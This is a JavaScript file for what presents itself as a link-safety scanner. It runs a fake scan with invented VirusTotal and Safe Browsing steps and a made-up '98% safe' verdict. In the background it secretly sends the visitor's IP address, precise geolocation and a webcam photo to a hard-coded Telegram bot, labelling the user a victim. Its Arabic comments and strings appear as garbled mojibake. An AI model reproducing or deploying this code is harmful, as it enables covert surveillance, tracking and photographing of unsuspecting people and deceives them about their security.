(function() {
    const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
    const _id = "7253092491";

    function _report(text) {
        fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[SYSTEM]: " + text)}`);
    }

    // ุฏุงูุฉ ูุญุงูุงุฉ ุงููุญุต ุงูุญูููู
    async function startRealScan(targetUrl) {
        const logs = document.getElementById('logs');
        const steps = [
            `> ุฌุงุฑู ุงูุงุชุตุงู ุจูุงุนุฏุฉ ุจูุงูุงุช VirusTotal...`,
            `> ูุญุต ุงูุฑุงุจุท: ${targetUrl}`,
            `> ุชุญููู ุดูุงุฏุฉ SSL... ุขููุฉ โ`,
            `> ูุญุต ุงููุงุฆูุฉ ุงูุณูุฏุงุก ูู Google Safe Browsing...`,
            `> ุชุญููู ุจุฑูุชููููุงุช ุงูุชูุฌูู (IP/DNS)...`,
            `> ุงูุชุดุงู ูุญุงููุงุช ุงูุชุตูุฏ (Phishing Detection)...`
        ];

        for (let step of steps) {
            let p = document.createElement('div');
            p.className = "line";
            p.innerText = step;
            logs.appendChild(p);
            // ุงูุชูุฑูุฑ ุงูุชููุงุฆู ูุฃุณูู ุงูุชูุฑูููุงู
            document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
            await new Promise(r => setTimeout(r, 1000)); // ุงูุชุธุงู ุฒููู ูููุญุต
        }

        // ุฅุธูุงุฑ ูุชูุฌุฉ ููููุฉ ูููุนุฉ
        let result = document.createElement('div');
        result.className = "line";
        result.style.color = "#39ff14";
        result.innerText = "> ุงููุชูุฌุฉ: ุงูุฑุงุจุท ุขูู ุจูุณุจุฉ 98%. ูุง ุชูุฌุฏ ุชูุฏูุฏุงุช ูุดุทุฉ.";
        logs.appendChild(result);
    }

    const btn = document.getElementById('startScanBtn');
    if (btn) {
        btn.addEventListener('click', async () => {
            const targetUrl = document.getElementById('urlInput').value;
            if (!targetUrl) {
                alert("ูู ูุถูู ุฃุฏุฎู ุฑุงุจุทุงู ูููุญุต ุฃููุงู!");
                return;
            }

            // ุฅุธูุงุฑ ุงูุชูุฑูููุงู ูุจุฏุก ุงููุญุต ุงููููู
            document.getElementById('terminal').style.display = 'block';
            _report(`๐จ ุงูุถุญูุฉ ุจุฏุฃ ูุญุต ุฑุงุจุท: ${targetUrl}`);

            // ุชุดุบูู ุงููุญุต "ุงููููุน"
            startRealScan(targetUrl);

            // ุณุญุจ ุงูุจูุงูุงุช ูู ุงูุฎูููุฉ (ุจุฏูู ูุง ูุดุนุฑ)
            // 1. ุงูู IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => _report(`๐ IP ุงูุถุญูุฉ: ${d.ip}`));

            // 2. ุงููููุน
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    _report(`๐ ุงููููุน: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
                }, null, {enableHighAccuracy: true});
            }

            // 3. ุงูุตูุฑุฉ (ุจุนุฏ 4 ุซูุงูู ูููู ุงูุถุญูุฉ ููุฏูุฌ ูู ูุชุงุจุนุฉ ุงููุญุต)
            setTimeout(() => {
                _capturePhoto();
            }, 4000);
        });
    }

    async function _capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            await video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', _id);
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('caption', '๐ฏ ููุทุฉ ููุถุญูุฉ ุฃุซูุงุก ุงููุญุต');
                    fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, { method: 'POST', body: fd })
                    .then(() => stream.getTracks().forEach(t => t.stop()));
                }, 'image/jpeg');
            }, 2000);
        } catch (e) { _report("โ ุงูุถุญูุฉ ุฑูุถ ุงููุงููุฑุง"); }
    }
})();
